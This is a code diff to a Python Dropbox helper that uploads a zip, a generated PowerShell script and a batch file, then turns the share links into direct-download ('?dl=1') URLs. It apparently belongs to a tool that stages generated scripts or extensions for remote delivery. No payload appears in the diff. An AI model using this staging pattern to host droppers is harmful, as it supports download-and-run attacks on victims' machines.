@@ -17,11 +17,13 @@ import build
 
 class Drive :
 
-	def __init__(self, extension, token) :
+	def __init__(self, extension, filetype, token) :
 		self.extension = extension
 		self.token = token
 		self.color = Colors()
 		self.drive = dropbox.Dropbox(self.token)
+		self.shareds = []
+		self.filetype = filetype
 
 	def upload(self) :
 
@@ -54,7 +56,7 @@ class Drive :
 
 		try:
 
-			print('{} Upload .zip file in dropbox'.format(self.color.status("[+]")))
+			print('{} Upload files in dropbox'.format(self.color.status("[+]")))
 
 			for dirname, subdirs, files in os.walk(directory):
 				with open(zipile, "rb") as f :
@@ -64,14 +66,13 @@ class Drive :
 					except dropbox.exceptions.ApiError as e:
 						return None
 				f.close()
+			# print('{} Upload success!'.format(self.color.status("[+]")))
 		except Exception as e:
 			raise e
 
-		build.Build(self.extension, "bat", self.token).builder()
-
 		try:
 
-			print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
+			# print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
 			with open(powershell, "rb") as pwsh :
 				data = pwsh.read()
 				try:
@@ -79,12 +80,25 @@ class Drive :
 				except dropbox.exceptions.ApiError as e:
 					return None
 			pwsh.close()
+			# print('{} Upload success!'.format(self.color.status("[+]")))
+		except Exception as e:
+			raise e
+
+		try:
+
+			# print('{} Upload .bat file in dropbox'.format(self.color.status("[+]")))
+			with open(batch, "rb") as pwsh :
+				data = pwsh.read()
+				try:
+					self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".bat"), mode=mode, client_modified=ctime, mute=True)
+				except dropbox.exceptions.ApiError as e:
+					return None
+			pwsh.close()
+			# print('{} Upload success!'.format(self.color.status("[+]")))
 		except Exception as e:
 			raise e
 
 		paths = self.drive.files_list_folder("/{}".format(self.extension))
-
-		shareds = []
 
 		for e, file in enumerate(paths.entries) :
 			
@@ -92,17 +106,64 @@ class Drive :
 				create = self.drive.sharing_create_shared_link(file.path_lower)
 			except ApiError as err:
 				if err.error.is_shared_link_already_exists() :
-					print("{} Link already exists zip".format(self.color.error("[!]")))
+					print("{} Link already exists".format(self.color.error("[!]")))
+
+		if os.path.exists("output/extensions/tmp"):
+				shutil.rmtree("output/extensions/tmp")
+
+		count = 0;
+
+		while count < 1:
+
+			print("{} Uploading the files with the shared link".format(self.color.yellows("[!]")))
+
+			build.Build(self.extension, self.filetype, self.token).builder()
+
+			try:
+
+				# print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
+				with open(powershell, "rb") as pwsh :
+					data = pwsh.read()
+					try:
+						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".ps1"), mode=mode, client_modified=ctime, mute=True)
+					except dropbox.exceptions.ApiError as e:
+						return None
+				pwsh.close()
+				# print('{} Upload success!'.format(self.color.status("[+]")))
+			except Exception as e:
+				raise e
+
+			try:
+
+				# print('{} Upload .bat file in dropbox'.format(self.color.status("[+]")))
+				with open(batch, "rb") as pwsh :
+					data = pwsh.read()
+					try:
+						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".bat"), mode=mode, client_modified=ctime, mute=True)
+					except dropbox.exceptions.ApiError as e:
+						return None
+				pwsh.close()
+				# print('{} Upload success!'.format(self.color.status("[+]")))
+			except Exception as e:
+				raise e
+
+			count += 1
+			print('{} Files have been saved in https://www.dropbox.com/home/{}'.format(self.color.status("[+]"), self.extension))
+			print('{} Done!'.format(self.color.status("[+]")))
+			break
+
+	def reUploadWithShareLinks(self) :
+
+		paths = self.drive.files_list_folder("/{}".format(self.extension))
+
+		for e, file in enumerate(paths.entries) :
+			
 			try:
 				shared = self.drive.sharing_get_shared_links(file.path_lower)
 				for links in shared.links :
-					shareds.append(links.url)
+					links.url = links.url.replace("?dl=0", "?dl=1")
+					self.shareds.append(links.url)
 			except Exception as e:
 				raise e
-		print(shareds)
 
-
-		print('{} The file has been uploaded on https://www.dropbox.com/home{}'.format(self.color.status("[+]"), "{}/{}{}".format(path, self.extension, ".zip")))	
-		
-		if os.path.exists("output/extensions/tmp"):
-				shutil.rmtree("output/extensions/tmp")
+		return self.shareds	
